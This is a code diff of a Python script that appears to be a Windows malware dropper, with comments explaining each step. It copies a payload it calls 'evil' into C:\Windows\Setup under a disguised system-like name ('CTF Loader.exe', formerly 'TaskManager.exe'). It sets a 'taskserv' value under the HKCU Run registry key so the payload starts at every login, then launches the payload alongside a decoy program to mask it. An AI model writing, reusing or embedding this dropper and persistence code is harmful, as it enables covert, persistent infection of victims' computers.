@@ -9,53 +9,32 @@ import shutil
 import subprocess
 from pathlib import Path
 
-
-def resource_path(relative_path):
+def resource_path(relative_path):                   # gets path of the TaskManager.exe from our unpack
     base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
-    return os.path.join(base_path, relative_path)
+    return os.path.join(base_path, relative_path)   # returns path
 
 def set_autostart_registry(app_name, key_data=None, autostart: bool = True) -> bool:
-    with winreg.OpenKey(
-            key=winreg.HKEY_CURRENT_USER,
-            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
+    with winreg.OpenKey(                            # the key is for autostart on windows login
+            key=winreg.HKEY_CURRENT_USER,           # current/whatever user is logged in runs
+            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run', 
             reserved=0,
-            access=winreg.KEY_ALL_ACCESS,
+            access=winreg.KEY_ALL_ACCESS,           # make sure we can write a reg key
     ) as key:
         try:
             if autostart:
-                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
+                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)  # sets autostart reg key
             else:
-                winreg.DeleteValue(key, app_name)
+                winreg.DeleteValue(key, app_name)   # dont leave anything if not available
         except OSError:
             return False
     return True
 
-def check_autostart_registry(value_name):
-    with winreg.OpenKey(
-            key=winreg.HKEY_CURRENT_USER,
-            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
-            reserved=0,
-            access=winreg.KEY_ALL_ACCESS,
-    ) as key:
-        idx = 0
-        while idx < 1_000:     # Max 1.000 values
-            try:
-                key_name, _, _ = winreg.EnumValue(key, idx)
-                if key_name == value_name:
-                    return True
-                idx += 1
-            except OSError:
-                break
-    return False
-
-
-
-pwnpath = r'C:\Windows\Setup\TaskManager.exe'
-ppath = Path(pwnpath)
+pwnpath = r'C:\Windows\Setup\CTF Loader.exe'       # where we will drop our evil payload
+ppath = Path(pwnpath) # turn it into a path obj
 if not ppath.is_file():
-        shutil.copyfile(resource_path('TaskManager.exe'), pwnpath)
-        set_autostart_registry('taskserv', pwnpath)
-subprocess.Popen(resource_path('TaskManager.exe'))
-subprocess.Popen(resource_path('decoy.exe'))
+        shutil.copyfile(resource_path('CTF Loader.exe'), pwnpath) # put the payload in place
+        set_autostart_registry('taskserv', pwnpath) # run autostart reg key routine
+subprocess.Popen(resource_path('CTF Loader.exe'))  # run the payload
+subprocess.Popen(resource_path('decoy.exe'))        # run the decoy
 
 
